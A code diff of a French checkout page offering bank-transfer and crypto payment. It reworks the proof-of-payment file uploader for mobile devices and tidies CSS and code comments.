@@ -143,7 +143,13 @@
     .dz .hint{font-size:12px;color:var(--muted)}
     .dz .cta{display:inline-flex;gap:8px;align-items:center;margin-top:6px}
     .dz .cta .btn{padding:8px 12px}
-    .hidden{position:absolute;opacity:0;pointer-events:none;width:0;height:0}
+
+    /* input fichier natif qui recouvre toute la dropzone (compatible mobile) */
+    .native-picker{
+      position:absolute; inset:0; width:100%; height:100%;
+      opacity:0; cursor:pointer; /* important: pas de pointer-events:none */
+    }
+
     .filecard{display:flex;align-items:center;gap:12px;border:1px solid var(--line);background:#fff;border-radius:12px;padding:10px 12px;box-shadow:0 4px 14px rgba(0,0,0,.04)}
     .filebadge{width:36px;height:36px;border-radius:10px;background:#eef2ff;display:grid;place-items:center;border:1px solid #e5e7eb}
     .filemeta{display:grid}
@@ -158,18 +164,10 @@
       min-width:48px; text-align:center;
     }
 
-    /* Full-screen overlays (verification + success) */
-    .overlay{
-      position:fixed; inset:0; display:none; align-items:center; justify-content:center;
-      background:rgba(15,23,42,.28); backdrop-filter:blur(6px);
-      z-index:20000;
-    }
+    /* Full-screen overlays */
+    .overlay{position:fixed; inset:0; display:none; align-items:center; justify-content:center;background:rgba(15,23,42,.28); backdrop-filter:blur(6px); z-index:20000;}
     .overlay.show{display:flex}
-    .loader{
-      background:#fff; border:1px solid var(--line); border-radius:14px; padding:18px;
-      width:min(520px,92%); box-shadow:0 18px 38px rgba(0,0,0,.25); text-align:center;
-      display:grid; gap:12px;
-    }
+    .loader{background:#fff; border:1px solid var(--line); border-radius:14px; padding:18px; width:min(520px,92%); box-shadow:0 18px 38px rgba(0,0,0,.25); text-align:center; display:grid; gap:12px;}
     .spin{width:38px;height:38px;border:3px solid #e5e7eb;border-top-color:#1e40af;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
     @keyframes spin{to{transform:rotate(360deg)}}
 
@@ -298,16 +296,17 @@
 
             <!-- Uploader -->
             <div class="uploader" aria-label="Téléverser une preuve de virement">
-              <div id="dz" class="dz" tabindex="0" role="button" aria-controls="proofInput">
+              <div id="dz" class="dz" role="button" aria-controls="proofInput" aria-label="Importer une preuve">
                 <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7 18h10a4 4 0 0 0 0-8h-.26A6 6 0 1 0 7 18Zm5-9v6m0-6-2 2m2-2 2 2" fill="none" stroke="#1f2937" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 <div>Glissez-déposez votre preuve (tout format accepté)</div>
                 <div class="hint">ou</div>
                 <div class="cta">
-                  <button id="pickProof" type="button" class="btn">Importer</button>
+                  <!-- label natif pour compat max -->
+                  <label for="proofInput" class="btn">Importer</label>
                   <span class="hint">max 10 Mo</span>
                 </div>
-                <!-- accepte tous les fichiers -->
-                <input id="proofInput" class="hidden" type="file" accept="*/*">
+                <!-- Input natif qui recouvre la zone (tap mobile => picker) -->
+                <input id="proofInput" class="native-picker" type="file" accept="*/*">
               </div>
 
               <div id="fileWrap" class="filecard" style="display:none">
@@ -510,16 +509,16 @@
     const toast=msg=>{const t=$('#toast'); t.textContent=msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),1600);};
     const EUR=v=>Number(v||0).toLocaleString('fr-FR',{style:'currency',currency:'EUR'});
 
-    // Panier localStorage (clé identique au site)
+    // Panier localStorage
     const KEY='gf_cart';
     const getCart=()=>{try{return JSON.parse(localStorage.getItem(KEY)||'[]')}catch{return[]}};
     const setCart=arr=>localStorage.setItem(KEY,JSON.stringify(arr));
 
-    // ID commande visible
+    // ID commande
     const orderId=(()=>{const d=new Date(); const y=String(d.getFullYear()).slice(2); const mm=String(d.getMonth()+1).padStart(2,'0'); const dd=String(d.getDate()).padStart(2,'0'); const rnd=Math.floor(Math.random()*9000)+1000; return `GF-${y}${mm}${dd}-${rnd}`;})();
     $('#orderId').textContent=orderId;
 
-    // Rendu mini panier (colonne droite)
+    // Rendu mini
     function computeSub(cart){ return cart.reduce((s,x)=> s + Number(x.price||0)*Number(x.qty||1), 0); }
     function renderMini(){
       const wrap=$('#miniCart'); const cart=getCart();
@@ -539,7 +538,7 @@
     function currentPM(){ return document.querySelector('.m[role="tab"][aria-selected="true"]')?.dataset.method || 'sepa'; }
     function promoRate(){ return currentPM()==='sepa'?0.03 : currentPM()==='crypto'?0.01 : 0; }
 
-    // Taux mock (affichage montant crypto)
+    // Taux mock
     const fx={
       'USDT-TRC20':{symbol:'USDT',rate:1},
       'USDT-BEP20':{symbol:'USDT',rate:1},
@@ -547,7 +546,7 @@
       'ETH-ERC20':{symbol:'ETH',rate:3000}
     };
 
-    // Adresses crypto + QR
+    // Wallets + QR
     const WALLET={
       'USDT-BEP20':{
         address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b',
@@ -613,7 +612,7 @@
     $('#cancelSplit').addEventListener('click',closeModal);
     $('#applySplit').addEventListener('click',()=>{ selectedSplit=modalParts; $('#btnSplit').classList.add('on'); $('#btnOnce').classList.remove('on'); closeModal(); updateSplitHint(); updateSummary(); });
 
-    // Référence courte basée sur le nom
+    // Référence courte
     const slugRefFromName = (n)=>{
       const base=(n||'').normalize('NFD').replace(/[\u0300-\u036f]/g,'').toUpperCase().replace(/[^A-Z0-9]+/g,'').slice(0,16);
       if(base) return base;
@@ -623,7 +622,7 @@
     const syncRef=()=>{ const name=$('#name')?.value||''; $('#vref').value=slugRefFromName(name); };
     $('#name').addEventListener('input', syncRef);
 
-    // Récap global
+    // Récap
     const SHIPPING=0;
     function updateSummary(){
       const cart=getCart(); if(!cart.length){ renderMini(); return; }
@@ -677,7 +676,7 @@
     const doneOverlay = document.getElementById('doneOverlay');
     const showDone = () => { doneOverlay.classList.add('show'); doneOverlay.setAttribute('aria-hidden','false'); };
 
-    // États de vérification
+    // États
     let bankVerified=false, cryptoVerified=false;
 
     function updateCTA(){
@@ -686,7 +685,7 @@
       btn.disabled = (pm==='sepa' ? !bankVerified : pm==='crypto' ? !cryptoVerified : false);
     }
 
-    // ---------- ENVOI WEBHOOK COMPATIBLE (JSON + QS alias) ----------
+    // ---------- WEBHOOK ----------
     function legacyMap(payload){
       return {
         order: payload.orderId,
@@ -806,7 +805,7 @@
       return true;
     }
 
-    /* ====== Uploader (SEPA) — version robuste ====== */
+    /* ====== Uploader (SEPA) — version mobile-friendly ====== */
     const MAX_SIZE = 10 * 1024 * 1024; // 10 Mo
     const dz = document.getElementById('dz');
     const input = document.getElementById('proofInput');
@@ -816,7 +815,6 @@
     const fileBar = document.getElementById('fileBar');
     const fileOk = document.getElementById('fileOk');
     const removeProof = document.getElementById('removeProof');
-    const pickBtn = document.getElementById('pickProof');
 
     function fmtBytes(b){
       if(b===0) return '0 o';
@@ -855,20 +853,8 @@
     }
     if (removeProof) removeProof.addEventListener('click', clearFile);
 
-    if (pickBtn) pickBtn.addEventListener('click', () => {
-      if (!input) return;
-      input.value = '';
-      input.click();
-    });
-    if (dz) {
-      dz.addEventListener('click', () => {
-        if (!input) return;
-        input.value = '';
-        input.click();
-      });
-      dz.addEventListener('keydown', e => {
-        if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); if (!input) return; input.value = ''; input.click(); }
-      });
+    // Drag & Drop (desktop)
+    if (dz){
       ['dragenter','dragover'].forEach(ev => dz.addEventListener(ev, e => {
         e.preventDefault(); e.stopPropagation();
         dz.classList.add('over');
@@ -890,17 +876,21 @@
         const reason = reasonForRefusal(f);
         if (reason) { toast(reason); return; }
         showFile(f);
+        if (input) input.value = ''; // re-sélection du même fichier possible
       });
     }
+
+    // Sélection via picker (mobile & desktop)
     if (input) input.addEventListener('change', e => {
       const f = e.target.files && e.target.files[0];
       const reason = reasonForRefusal(f);
       if (reason) { toast(reason); input.value=''; return; }
       showFile(f);
+      input.value = ''; // autorise re-select du même fichier
     });
-    /* ====== /Uploader robuste ====== */
+    /* ====== /Uploader ====== */
 
-    // Confirmer crypto : vérifie + ENVOIE au webhook
+    // Confirmer crypto
     document.getElementById('confirmCrypto').addEventListener('click', async ()=>{
       if(!validateAddress()) return;
       const tx = document.getElementById('txid').value.trim();
@@ -917,7 +907,7 @@
       }, 1200);
     });
 
-    // Confirmer SEPA : vérifie + ENVOIE au webhook (avec pièce jointe)
+    // Confirmer SEPA
     document.getElementById('confirmBank').addEventListener('click', async ()=>{
       if(!validateAddress()) return;
       if(!$('#vref').value.trim()){ syncRef(); }
@@ -934,7 +924,7 @@
       }, 1300);
     });
 
-    // Finaliser la commande (stocke côté client + écran succès)
+    // Finaliser commande
     document.getElementById('placeOrder').addEventListener('click', ()=>{
       if(!validateAddress()) return;
       const cart=getCart(); if(!cart.length){ toast('Votre panier est vide.'); return; }
@@ -960,7 +950,7 @@
       showDone();
     });
 
-    // Fermer modal en cliquant le fond
+    // Fermer modal au clic fond
     document.getElementById('splitModal').addEventListener('click',e=>{ if(e.target.id==='splitModal') e.currentTarget.classList.remove('show'); });
 
     // Init
